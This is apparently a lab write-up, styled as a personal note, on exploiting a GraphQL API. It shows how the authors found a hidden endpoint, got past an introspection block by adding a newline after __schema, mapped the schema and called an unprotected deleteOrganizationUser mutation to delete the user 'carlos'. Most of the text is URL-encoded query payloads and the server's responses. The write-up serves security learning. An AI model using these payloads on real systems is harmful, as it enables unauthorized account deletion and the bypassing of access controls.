
# **WSA-GraphQL-Lab3: THE MUTATION GAMBIT**

_An #ND-AF / #AuDHD Perspective on GraphQL Mutation Exploitation_  
`// Because sometimes the most dangerous queries are the ones that change things` ⚡🎲

**AUTHORS:**
- **51n5337** - *The Arghmage* 🧙‍♂️🔮 | Your nerd bro from the block, that ghost in the grid
- **#OG** - *The Unseen Sentinel* 🏳️‍⚧️⚡ | Silent protocol analyst, pattern breaker, reality debugger
- **AFFILIATION:** [`>dr.kb< multiverse-lib`](https://bkornpob.github.io) 🌐🧠 | **Where hyperfocus archives collide with reality**

**INCIDENT DATE:** [System Time: 2025-11-02]  
**CLASSIFICATION:** `GRAPHQL_UNAUTHORIZED_MUTATION` | `USER_DELETION_VIA_BROKEN_ACCESS_CONTROL`  
**VIBE CHECK:** `AUTISTIC_SQUIRREL_DELETING_THE_WRONG_NUT` 🐿️🗑️⚡

---

[...back](../note-1.md)

*key investigation*
```
> cannot find any obvious graphql endpoint
> fuzz
> > found `POST /graphql?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D` -- method not allowed
> > #q1 send GET with a hit!

> note: introspection is not allowed, #q2
> > note: `%0A` after `__schema` for evasion

> #q3 reveals __schema
> > mutation{deleteOrganizationUser}, query{getUser}
> > DeleteOrganizationUserInput, DeleteOrganizationUserResponse{user}
> > User{id,username}

> cannot get admin pass? mutation{deleteOrganizationUser(username:"carlos")}?

> #q4 reveals for deleteOrganizationUser 
> > requiring DeleteOrganizationUserResponse
> > username is unknown field <<< might be user id
> > > not id either #q5

> #q6 reveals mutation structure
> > note: input as object not argument
> > from here a more direct approach will be discussed later
> > what we went through was error-driven

> #q7-8
> > id is required #q7, reveal carlos id #q8

> #q9, bye bye carlos
```

*keys*
```
> graphql endpoint was hidden, and introspection block (not allowed POST)... fuzz and found `GET /graphql?query=...` endpoint
> reveal schema structure shows that
> > cannot get password from query{getUser}
> > mutation{deleteOrganizationUser} is potential
> reveal mutation{deleteOrganizationUser}, make payload, and say bye to carlos
> > in this writeup, we went through error-driven method
```

*try*
```
`query%7B__type(name%3A%22DeleteOrganizationUserInput%22)%7BinputFields%7Bname%20type%7Bname%7D%7D%7D%7D`

to approach with a less error-driven
```

[read more about graphqlstructure-to-payload](../../graphqlstructure-to-payload/note-1.md)

---

### q1 fuzz POST /graphql

```
#query
GET /api?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D

---

#response
{
  "data": {
    "__schema": {
      "queryType": {
        "name": "query"
      }
    }
  }
}
```

note `%0A` after `__schema`

---

### q2 inspection not allowed

try not using `%0A`
```
#query
GET /api?query=query%7B__schema%7BqueryType%7Bname%7D%7D%7D

#response
{
  "errors": [
    {
      "locations": [],
      "message": "GraphQL introspection is not allowed, but the query contained __schema or __type"
    }
  ]
}
```

---

### q3 reveals schema

```
#query
query{__schema{types{name fields {name description}}}}

#OG 
query%7B__schema%0A%7Btypes%7Bname%20fields%20%7Bname%20description%7D%7D%7D%7D

#note %0A

#response
{
  "data": {
    "__schema": {
      "types": [
        {
          "name": "Boolean",
          "fields": null
        },
        {
          "name": "DeleteOrganizationUserInput",
          "fields": null
        },
        {
          "name": "DeleteOrganizationUserResponse",
          "fields": [
            {
              "name": "user",
              "description": null
            }
          ]
        },
        {
          "name": "Int",
          "fields": null
        },
        {
          "name": "String",
          "fields": null
        },
        {
          "name": "User",
          "fields": [
            {
              "name": "id",
              "description": null
            },
            {
              "name": "username",
              "description": null
            }
          ]
        },
        {
          "name": "__Directive",
          "fields": [
            {
              "name": "name",
              "description": "The __Directive type represents a Directive that a server supports."
            },
            {
              "name": "description",
              "description": null
            },
            {
              "name": "isRepeatable",
              "description": null
            },
            {
              "name": "locations",
              "description": null
            },
            {
              "name": "args",
              "description": null
            }
          ]
        },
        {
          "name": "__DirectiveLocation",
          "fields": null
        },
        {
          "name": "__EnumValue",
          "fields": [
            {
              "name": "name",
              "description": null
            },
            {
              "name": "description",
              "description": null
            },
            {
              "name": "isDeprecated",
              "description": null
            },
            {
              "name": "deprecationReason",
              "description": null
            }
          ]
        },
        {
          "name": "__Field",
          "fields": [
            {
              "name": "name",
              "description": null
            },
            {
              "name": "description",
              "description": null
            },
            {
              "name": "args",
              "description": null
            },
            {
              "name": "type",
              "description": null
            },
            {
              "name": "isDeprecated",
              "description": null
            },
            {
              "name": "deprecationReason",
              "description": null
            }
          ]
        },
        {
          "name": "__InputValue",
          "fields": [
            {
              "name": "name",
              "description": null
            },
            {
              "name": "description",
              "description": null
            },
            {
              "name": "type",
              "description": null
            },
            {
              "name": "defaultValue",
              "description": null
            },
            {
              "name": "isDeprecated",
              "description": null
            },
            {
              "name": "deprecationReason",
              "description": null
            }
          ]
        },
        {
          "name": "__Schema",
          "fields": [
            {
              "name": "description",
              "description": null
            },
            {
              "name": "types",
              "description": "A list of all types supported by this server."
            },
            {
              "name": "queryType",
              "description": "The type that query operations will be rooted at."
            },
            {
              "name": "mutationType",
              "description": "If this server supports mutation, the type that mutation operations will be rooted at."
            },
            {
              "name": "directives",
              "description": "'A list of all directives supported by this server."
            },
            {
              "name": "subscriptionType",
              "description": "'If this server support subscription, the type that subscription operations will be rooted at."
            }
          ]
        },
        {
          "name": "__Type",
          "fields": [
            {
              "name": "kind",
              "description": null
            },
            {
              "name": "name",
              "description": null
            },
            {
              "name": "description",
              "description": null
            },
            {
              "name": "fields",
              "description": null
            },
            {
              "name": "interfaces",
              "description": null
            },
            {
              "name": "possibleTypes",
              "description": null
            },
            {
              "name": "enumValues",
              "description": null
            },
            {
              "name": "inputFields",
              "description": null
            },
            {
              "name": "ofType",
              "description": null
            },
            {
              "name": "specifiedByURL",
              "description": null
            }
          ]
        },
        {
          "name": "__TypeKind",
          "fields": null
        },
        {
          "name": "mutation",
          "fields": [
            {
              "name": "deleteOrganizationUser",
              "description": null
            }
          ]
        },
        {
          "name": "query",
          "fields": [
            {
              "name": "getUser",
              "description": null
            }
          ]
        }
      ]
    }
  }
}
```

---

### q4 mutation{deleteOrganizationUser}

```
#recall lab2
query{getUser}
  User{id,username,password}
> query { getUser(id: 1) { username password } }

#this case
mutation{deleteOrganizationUser}
  DeleteOrganizationUserInput, DeleteOrganizationUserResponse{user}
    User{id,username}
> mutation { deleteOrganizationUser(username: "carlos")}

#query
mutation%20%7B%20deleteOrganizationUser%28username%3A%20%22carlos%22%29%20%7D

#response
{
  "errors": [
    {
      "extensions": {},
      "locations": [
        {
          "line": 1,
          "column": 12
        }
      ],
      "message": "Validation error (SubselectionRequired@[deleteOrganizationUser]) : Subselection required for type 'DeleteOrganizationUserResponse' of field 'deleteOrganizationUser'"
    },
    {
      "extensions": {},
      "locations": [
        {
          "line": 1,
          "column": 35
        }
      ],
      "message": "Validation error (UnknownArgument@[deleteOrganizationUser]) : Unknown field argument 'username'"
    }
  ]
}
```

---

### q5 id instead of username?

```
#query
mutation%20%7B%20deleteOrganizationUser%28id%3A%20%221%22%29%20%7D

#response
"Validation error (UnknownArgument@[deleteOrganizationUser]) : Unknown field argument 'id'"
```

---

### q6 reveal mutation structure

```
#query
query%7B__type%0A(name%3A%22mutation%22)%7Bfields%7Bname%20args%7Bname%20type%7Bname%7D%7D%7D%7D%7D
> > query{__type<newline>(name:"mutation"){fields{name args{name type{name}}}}}

#response
{
  "data": {
    "__type": {
      "fields": [
        {
          "name": "deleteOrganizationUser",
          "args": [
            {
              "name": "input",
              "type": {
                "name": "DeleteOrganizationUserInput"
              }
            }
          ]
        }
      ]
    }
  }
}
```

---

### q7 input as object not argument

```
#query
mutation%7BdeleteOrganizationUser%28input%3A%7Busername%3A%22carlos%22%7D%29%7Buser%7Bid%20username%7D%7D%7D
> > mutation{deleteOrganizationUser(input:{username:"carlos"}){user{id username}}}

#response
{
  "errors": [
    {
      "extensions": {},
      "locations": [
        {
          "line": 1,
          "column": 35
        }
      ],
      "message": "Validation error (WrongType@[deleteOrganizationUser]) : argument 'input' with value 'ObjectValue{objectFields=[ObjectField{name='username', value=StringValue{value='carlos'}}]}' is missing required fields '[id]'"
    }
  ]
}
```

note: must know id

---

### q8 get carlos id

```
#query
query%7BgetUser%28id%3A3%29%7Bid%20username%7D%7D

#response
{
  "data": {
    "getUser": {
      "id": 3,
      "username": "carlos"
    }
  }
}
```

---

# q9 delete carlos

```
#query
mutation%7BdeleteOrganizationUser%28input%3A%7Bid%3A3%7D%29%7Buser%7Bid%20username%7D%7D%7D
> mutation{deleteOrganizationUser(input:{id:3}){user{id username}}}

#response
we are sorry to see you go...
```

---

[...back](../note-1.md)
